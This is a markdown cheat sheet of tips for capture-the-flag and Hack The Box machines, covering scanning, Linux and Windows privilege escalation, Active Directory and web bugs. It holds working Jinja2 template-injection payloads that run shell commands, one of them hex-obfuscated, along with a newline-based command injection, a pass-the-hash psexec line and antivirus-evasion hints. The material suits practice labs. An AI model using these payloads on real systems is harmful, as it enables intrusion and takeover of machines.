# Tips and Tricks for CTF and HTB boxes
## Enumeration
- Look for source code on Github of open source softwares and their "Security annoucements", try to enumerate the version and released date.
- Use md5 of library file to looks up date or version on VirusTotal
- Looks for security fixes in the next version of current version
- Keep and eye on little detail
- Vhost maybe use on both 80 and 443
- Take any domains you see into /etc/hosts
- Check SSL certificate for more informations
- Always enumerate on subdomains and virtual hosts
- Run gobuster with php,html,zip,txt extension
- Always use newest version of scripts


## Scanning
- Nmap: Scanning UDP is not reliable, always try more scanning with UDP ports (run with --top-ports and -sC or -sV for probing)
- Nmap: Always remember to run Nmap with UDP and vulnerable scripts
- Nmap: Can't run SYN scan through Proxy and sometimes VPN
- Nmap: Some port can't be detected but run important service, remember to check all of them on Internet
- WPScan: only use enumerate all plugins or all themes at once, not both at the same time. 
- Scanning CMS: magescan for Magento, droopescan for Wordpress, SilverStripe and Drupal, wpscan for Wordpress

## Linux
- Check users's mails
- Always try hijacking path if the PATH is writable. 
- Check port knocking if some ports are filtered at /etc/knockd.conf (depends)
- Always patiently check for weird files and folders
- Use ltrace for better anaylysing system calls
- Exploit for shell command injection: newline=$'\n' ; bla${newline}/bin/bash${newline}bla or $(printf 'bla\n/bin/bash\nbla')
- Owner and group owner and even suid bit of a binary doesn't change after transferring through internet and can be used to tampered with suid binary
- Use apport-unpack to extract crashed coredump to file system 
- Check parent directory's permission of files that we don't have permission

## Windows
- Always check local exploits first
- `systeminfo`: Hotifx(s) : N/a means the box hasn't updated 
- Web Server uses WebDav protocol: Use davtest and cadaver to exploit.
- Migrate to another process if you have an unstable shell.
- Always try snmp-check on Windows boxes
- Sometimes we must manually grant privilege on some locations in order to have our own privileges
- Change to other user: https://superuser.com/questions/1420850/is-there-a-way-to-switch-user-from-powershell-or-cmd, or `New-PSSession -Credential $cred | Enter-PSSession` with computername\username (remote managers)
- wsman and msrm to remote login on Windows
- Check for installed programs in Program Files or Program Files x86
- Can use the obfuscator release of winPEAS to bypass some AV
- `net user administrator password` to change admin password if we have a local admin account
- Juicy Potato still works with some versions of Windows 10
- Pass the hash must go with username: `psexec -hashes NThash:LMhash Administrator@10.10.10.63`
- Check the arch of shell process, some PE vectors can only be performed on 64 bits shell
- Check for which services user can start https://0xdf.gitlab.io/2020/04/25/htb-control.html, Ippsec has good video about services in Control box

## Active Directory
- Use BloodHound and SharpHound to gather information about AD, mark some users as Owned then use "Shortest Path from Owned Principals".
- Dsync attack to get domain admins password and pass the hash -> Forest box in HTB

## Softwares:
- VNC is a remote access application and can be accessed with vncviewer
- Use odat for Oracle Database, and use --sysdba for make the user privileged
- Config for IKE VPN -> Conceal box in HTB.
- lxd containers are under /var/lib/lxc directory
- https://quipqiup.com/ testing bunch of ciphers


## Web Security
- Bypass eval blacklist a-zA-Z https://ironhackers.es/en/tutoriales/saltandose-waf-ejecucion-de-codigo-php-sin-letras/
- SSTI Jinja 2 https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/
- You can include(file_descriptor) in PHP with /dev/fd/
- Url can be automatically changed to lowercase to bypass filter (GOOGLE.COM -> google.com), even schemes like HtTp or FiLe
- Object.getOwnPropertyNames(obj).get() or .value to get property from object in Javascript
- Sometimes unquoted urllib python can be bypassed by double encoding
- If the chall uses child_prcocess and we can modify it's variables, try prototype pollution for modifying shell variable to 'bash' (thanks nhoc n3mo)
- Some useful payloads for SSTI Jinja2 with Python3:
  - `{{self.__init__.__globals__.__builtins__.__import__('os')}}`
  - `{{''.__class__.mro()[1].__subclasses__()[132].__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}`
  - `{{''|attr('\x5f\x5fclass\x5f\x5f')|attr('\x5f\x5f\x6d\x72\x6f\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')(1)|attr('\x5f\x5fsubclasses\x5f\x5f')()|attr('\x5f\x5fgetitem\x5f\x5f')(132)|attr('\x5f\x5finit\x5f\x5f')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('\x6f\x73')|attr('\x70\x6f\x70\x65\x6e')('id')|attr('read')()}}`
  - `{{ ''.__class__.__mro__[1].__subclasses__()[408]("id", shell=True, stdout=-1).communicate() }}`
- Remember to hunt to noSQLi when facing to a login form 
- Good sqli article: https://websec.wordpress.com/2010/03/19/exploiting-hard-filtered-sql-injections/


## Forensics
- Image steg: zsteg, stegsolve, steghide, stegdetect
- Text steg: stegsnow
- Other steg: binwalk, foremost
- Memory Dump: volatility
- Sound analysing: Audacity, Sonic Visualizer
